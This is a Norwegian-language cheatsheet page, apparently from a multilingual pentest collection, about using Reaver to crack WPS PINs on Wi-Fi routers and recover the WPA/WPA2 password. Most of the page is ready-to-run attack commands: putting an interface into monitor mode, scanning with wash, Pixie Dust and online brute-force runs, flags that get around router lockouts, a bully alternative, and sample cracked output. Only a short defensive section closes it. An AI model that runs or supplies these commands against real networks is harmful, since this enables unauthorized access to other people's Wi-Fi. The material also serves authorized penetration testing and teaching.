<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# Reaver Cheatsheet

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) er et spesialisert Wi-Fi-sikkerhetsrevisjonsverktøy utviklet for å utføre brute-force-angrep mot Wi-Fi Protected Setup (WPS)-registrator-PIN-er. Ved å gjenopprette den 8-sifrede WPS PIN-koden, henter Reaver den forhåndsdelte WPA/WPA2-nøkkelen (PSK) i ren tekst. Den støtter også offline Pixie Dust-angrep via `pixiewps`.

---

## Innholdsfortegnelse

– [WPS Vulnerability Mechanics](#wps-vulnerability-mechanics)
- [Installasjon (`reaver` & `pixiewps`)](#installation-reaver--pixiewps)
- [Rekognosering: Identifisere WPS-nettverk (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (Instant Key Recovery)](#pixie-dust-attack-instant-key-recovery)
- [Full online WPS PIN Brute-Force](#full-online-wps-pin-brute-force)
- [AP Rate Limiting & Lockout Handling](#ap-rate-limiting--lockout-handling)
- [Defensive Mitigation](#defensive-mitigation)

---

## WPS-sårbarhetsmekanikk

WPS PIN-autentisering bruker en 8-sifret PIN-kode delt i to halvdeler:
- Første halvdel er 4 sifre ($10^4 = 10 000$ muligheter).
- Andre halvdel er 3 sifre + 1 kontrollsumsiffer ($10^3 = 1000$ muligheter).
- I stedet for å teste $10^8 = 100 000 000$-kombinasjoner, tester en angriper kun maksimalt $10 000 + 1000 = 11 000$-forsøk.
- **Pixie Dust Attack:** Utnytter svak PRNG (Pseudo-Random Number Generators) i spesifikke trådløse brikkesett (Ralink, MediaTek, Realtek, Broadcom) for å beregne WPS-PIN-koden offline på sekunder fra bare 2 innledende pakker.

---

## Installasjon (`reaver` & `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Rekognosering: Identifisering av WPS-nettverk (`wash`)

Før du starter Reaver, finn tilgangspunkter med WPS aktivert og sjekk om de er låst:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Viktige kolonner å observere:
- **`WPS Locked`**: Hvis `Yes`, har ruteren låst WPS PIN-forsøk på grunn av tidligere brute-force-aktivitet. Målrutere som viser `No`.
- **`WPS Ver`**: WPS-versjon (1.0 eller 2.0).
- **`ESSID` & `BSSID`**: Målnettverksnavn og MAC.

---

## Pixie Dust Attack (umiddelbar nøkkelgjenoppretting)

Pixie Dust-angrepet (`-K 1`) er det raskeste angrepet mot WPS. Den samler inn E-Hash1, E-Hash2 og nonces fra ruteren og knekker PIN-koden offline uten å utløse hastighetsgrenser:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Skjermmodusgrensesnitt.
- `-b <bssid>`: Målruter MAC.
- `-c 6`: Kanal til mål-AP.
- `-K 1`: Kjør automatisk Pixie Dust-angrep via `pixiewps`.
- `-vv`: Utførlig utgang.

*Hvis den er sårbar, skrives PIN-koden og WPA PSK ut på under 10 sekunder.*

---

## Full online WPS PIN Brute-Force

Hvis Pixie Dust mislykkes, fall tilbake til online brute-forcing:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Når PIN-koden er oppdaget, sender Reaver ut:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## AP Rate Limiting & Lockout Handling

Mange moderne rutere låser WPS-forsøk i 5-15 minutter etter 3-5 mislykkede forsøk. Bruk forsinkelsesflagg og prøv tuning på nytt:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternativ: Bruke `bully`
`bully` er en rask C-implementering av WPS-angrepet som håndterer ulike ruterimplementeringer godt:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Defensiv reduksjon

- **Deaktiver WPS helt:** Den sikreste anbefalingen er å slå av WPS i ruterens nettgrensesnitt.
- **Oppdater fastvare:** Moderne rutere implementerer streng hastighetsbegrensning, eksponentiell backoff og fikser PRNG-entropifeil utnyttet av Pixie Dust.
- **Bruk WPA3:** WPA3 fjerner eldre PIN-basert WPS fullstendig, og erstatter den med sikker Wi-Fi Easy Connect (DPP).